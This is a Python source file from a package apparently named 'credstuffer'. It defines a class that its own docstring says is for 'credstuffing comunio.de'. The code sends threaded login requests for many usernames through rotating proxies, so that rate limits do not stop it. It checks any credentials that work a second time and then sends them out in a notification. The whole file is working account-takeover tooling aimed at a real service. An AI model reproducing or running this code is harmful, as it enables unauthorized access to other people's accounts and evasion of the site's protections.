import logging
import requests
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

from credstuffer import UserAccount
from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError, \
    InternetConnectionError


class Comunio(UserAccount):
    """ class Comunio to provide basic methods for credstuffing comunio.de

    USAGE:
            comunio = Comunio(max_requests=10000, notify='mail', **kwargs)

    """

    def __init__(self, max_requests=10000, notify=None, token=None, **kwargs):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class Comunio')
        self.name = 'Comunio'

        # init base class
        super().__init__(name=self.name, notify=notify, token=token, **kwargs)

        self.headers.update({
            'Origin': 'http://www.comunio.de',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://www.comunio.de/home',
            })
        self.comunio_login_url = 'http://api.comunio.de/login'

        self.max_requests = max_requests
        self.request_counter = 0

    def login(self, password):
        """ requests given login data to the account

        """

        # check if proxy is set
        if self.session.proxies:

            # check if we need a new proxy
            if self.request_counter < self.max_requests:

                with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:

                    future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
                    for i, future in enumerate(as_completed(future_response)):
                        user = future_response[future]
                        statuscode = future.result().status_code

                        if (self.request_counter % len(self.usernames)) == 0:
                            self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                         .format(statuscode, user, password, self.session.proxies['http']))

                        if statuscode == 200:
                            self.is_credentials_correct(user=user, password=password)
                        elif statuscode != 400:
                            raise ProxyNotSetError("Wrong response code {}. Renew Proxy!".format(statuscode))

            else:
                # raise Error to renew Proxy
                self.request_counter = 0
                self.logger.error("Max number of proxy requests reached!. Renew Proxy!")
                raise ProxyMaxRequestError("Max number of proxy requests reached!")
        else:
            raise ProxyNotSetError("No Proxy was set! Renew Proxy!")

    def __request_login(self, username, password):
        """ request login with an session object

        :return: Request response object
        """
        login_form = [('username', username), ('password', password), ]

        try:
            request_login = self.session.post(self.comunio_login_url, headers=self.headers, data=login_form,
                                              timeout=self.login_request_timeout, allow_redirects=False)
            
            self.request_counter += 1

        except requests.exceptions.RequestException as ex:
            if self.is_internet_available():
                raise ProxyBadConnectionError("RequestException with Bad Proxy Connection: {}".format(ex))
            else:
                raise InternetConnectionError("RequestException with InternetConnectionError: {}".format(ex))

        except Exception as ex:
            if self.is_internet_available():
                raise ProxyBadConnectionError("Exception with Bad Proxy Connection: {}".format(ex))
            else:
                raise InternetConnectionError("Exception with InternetConnectionError: {}".format(ex))

        return request_login

    def set_proxy(self, proxy):
        """ sets a proxy

        """
        if isinstance(proxy, dict):
            self.logger.info("set proxy to {}".format(proxy['http']))
            self.session.proxies = proxy
        else:
            raise TypeError("proxy must be type of dictionary!")

    def is_credentials_correct(self, user, password):
        """ Double check of given credentials

        :param user: username
        :param password: password
        """
        sleep(2)
        req_resp = self.__request_login(username=user, password=password)

        if req_resp.status_code == 200:
            self.logger.info("Fulfilled double check of credentials username: {} and password: {}".format(user, password))
            self.send_notification(username=user, password=password)
        else:
            self.logger.error("Wrong comunio credentials username: {} and password: {}".format(user, password))
